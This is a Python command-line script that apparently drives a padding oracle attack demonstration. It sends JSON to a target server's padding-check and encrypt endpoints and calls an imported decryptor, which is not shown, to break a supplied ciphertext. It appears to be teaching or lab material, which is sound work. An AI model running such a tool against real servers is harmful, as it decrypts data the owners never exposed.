from OraclePaddingDecryptor import *
from ServerClient import *
import argparse


def main(server: str, text: str, test: bool, encrypt: bool):

    if test:
        data = bytes(text, 'utf-8')
        client = ServerClient(server)
        headers = {'Content-type': 'application/json'}
        json_dict = {'ciphertext': data.decode('utf-8')}
        json_data = json.dumps(json_dict)
        result = client.send_post('/checkpadding', json_data, headers)
        print(result)
        return

    if encrypt:
        data = bytes(text, 'utf-8')
        client = ServerClient(server)
        headers = {'Content-type': 'application/json'}
        json_dict = {'plaintext': data.decode('utf-8')}
        json_data = json.dumps(json_dict)
        result = client.send_post('/encrypt', json_data, headers)
        print(result)
        return

    decryptor = OraclePaddingDecryptor(text, server)
    decrypted = decryptor.decrypt_bytes()
    print('Final result: \"' + bytes.decode(decrypted, 'utf-8') + '\"')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='A simple exemplary app for Padding Oracle Attack demonstration',)

    parser.add_argument('server', metavar='SERVER', help="""
        URL of the server to be attacked
        """)
    parser.add_argument('text', metavar='TEXT', help="""
        Text to decrypt (ciphertext), encrypt or check padding
        """)

    parser.add_argument('-t', '--test', help="""
        Performs a simple check of padding instead of breaking the ciphertext
        """, action='store_true')
    parser.add_argument('-e', '--encrypt', help="""
        Ask server to encrypt your message instead of breaking the ciphertext
        """, action='store_true')

    args = parser.parse_args()

    main(args.server, args.text, args.test, args.encrypt)
